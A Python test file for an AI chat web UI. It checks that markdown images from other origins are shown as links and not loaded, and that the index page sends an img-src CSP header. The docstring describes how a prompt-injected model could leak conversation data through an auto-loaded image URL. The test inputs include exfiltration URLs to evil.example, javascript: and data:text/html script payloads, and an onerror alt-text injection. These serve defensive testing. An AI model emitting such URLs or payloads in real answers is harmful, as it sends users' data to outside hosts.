"""The web UI loads only the server's own images by itself.

Reported 2026-11-22 by tai: a markdown image in an answer became an `<img>`
and the browser fetched it as soon as the answer rendered, with no click. A
model that read a prompt injection could put conversation data into such a
URL (`![x](https://host/a.png?d=...)`), and rendering sent it to that host;
the same for a loopback or intranet address. Two layers now stop that:

- `ppxai/web/shared/image-policy.js` (marked's image renderer, installed by
  `app.js::setupMarkdown`) loads a relative path, the page's own origin,
  `data:image/...` and `blob:`; any other image becomes a link;
- `GET /` sends `Content-Security-Policy: img-src 'self' data: blob:`.

VSCode's webview CSP (`default-src 'none'`, no `img-src`) already blocks
remote images; the TUIs fetch none.
"""

from __future__ import annotations

import asyncio
import json
import pathlib
import shutil
import subprocess

import pytest

from ppxai.server.routes import static

ROOT = pathlib.Path(__file__).resolve().parent.parent
POLICY_JS = ROOT / "ppxai" / "web" / "shared" / "image-policy.js"
MARKED_JS = ROOT / "ppxai" / "web" / "lib" / "marked.min.js"
APP_JS = ROOT / "ppxai" / "web" / "app.js"
INDEX_HTML = ROOT / "ppxai" / "web" / "index.html"
NODE = shutil.which("node")
ORIGIN = "http://127.0.0.1:54320"

needs_node = pytest.mark.skipif(NODE is None, reason="node is required")


def _render(markdown: str, origin: str = ORIGIN) -> str:
    """Render through the real marked + the real policy, the way app.js does."""
    script = (
        f"const {{marked}} = require({json.dumps(str(MARKED_JS))});"
        f"const p = require({json.dumps(str(POLICY_JS))});"
        f"const origin = {json.dumps(origin)};"
        "marked.use({renderer: {image(h, t, x) { return p.imageHtml(h, t, x, origin); }}});"
        f"process.stdout.write(marked.parse({json.dumps(markdown)}));"
    )
    out = subprocess.run([NODE, "-e", script], capture_output=True, text=True, timeout=30)
    assert out.returncode == 0, out.stderr
    return out.stdout


@needs_node
class TestTheRendererLoadsOnlyTheServersImages:
    @pytest.mark.parametrize("src", [
        "https://evil.example/a.png?d=secret",
        "http://evil.example/a.png",
        "//evil.example/a.png",
        "\\\\\\\\evil.example/a.png",  # two backslashes after markdown unescapes
        "/\\\\evil.example/a.png",
        "http://127.0.0.1:8080/admin.png",
        "http://localhost:54320/x.png",
        "http://192.168.1.1/x.png",
        "ftp://evil.example/x.png",
        "javascript:alert(1)",
        "data:text/html,<script>alert(1)</script>",
    ])
    def test_another_origin_is_not_loaded(self, src):
        html = _render(f"see ![leak]({src}) here")
        assert "<img" not in html

    def test_a_remote_image_becomes_a_link_naming_its_host(self):
        html = _render("![chart](https://evil.example/a.png?d=secret)")
        assert 'class="external-image"' in html
        assert 'href="https://evil.example/a.png?d=secret"' in html
        assert "evil.example" in html and 'rel="noopener noreferrer"' in html

    @pytest.mark.parametrize("src", [
        f"{ORIGIN}/files/image/plot.png?session=abc",
        "/files/image/plot.png",
        "img/plot.png",
        "data:image/png;base64,iVBORw0KGgo=",
        "blob:http://127.0.0.1:54320/1234",
    ])
    def test_the_servers_own_images_load(self, src):
        html = _render(f"![plot]({src})")
        assert "<img" in html and "external-image" not in html

    def test_a_hub_prefixed_server_url_is_the_same_origin(self):
        html = _render(f"![p]({ORIGIN}/hub/h/pop-os/files/image/p.png)")
        assert "<img" in html

    def test_alt_text_cannot_break_out(self):
        html = _render('![x" onerror="alert(1)](https://evil.example/a.png)')
        assert "onerror=\"" not in html
        html = _render('![x" onerror="alert(1)](img/a.png)')
        assert "onerror=\"" not in html

    def test_no_page_origin_loads_only_relative_and_data(self):
        assert "<img" not in _render(f"![p]({ORIGIN}/x.png)", origin="null")
        assert "<img" in _render("![p](img/x.png)", origin="null")


class TestTheWebUiUsesIt:
    def test_app_js_installs_the_image_renderer(self):
        src = APP_JS.read_text(encoding="utf-8")
        start = src.index("setupMarkdown() {")
        body = src[start:src.index("// === Server Connection ===", start)]
        assert "image(href, title, text)" in body
        assert "PpxaiImagePolicy" in body and "imageHtml(" in body

    def test_index_loads_the_policy_before_app_js(self):
        html = INDEX_HTML.read_text(encoding="utf-8")
        assert html.index('src="shared/image-policy.js"') < html.index('src="app.js')


class TestTheIndexPageSendsTheCsp:
    def test_img_src_is_self_data_and_blob(self, tmp_path, monkeypatch):
        (tmp_path / "index.html").write_text("<html><head></head><body></body></html>",
                                             encoding="utf-8")
        monkeypatch.setattr(static, "WEB_UI_DIR", tmp_path)
        resp = asyncio.run(static.serve_index())
        assert resp.status_code == 200
        assert resp.headers["content-security-policy"] == "img-src 'self' data: blob:"

    def test_only_img_src_is_restricted(self):
        # A script-src or connect-src here would break the UI (inline
        # schema script, SSE, the hub); this header is about images only.
        assert [d.split()[0] for d in static.INDEX_CSP.split(";")] == ["img-src"]
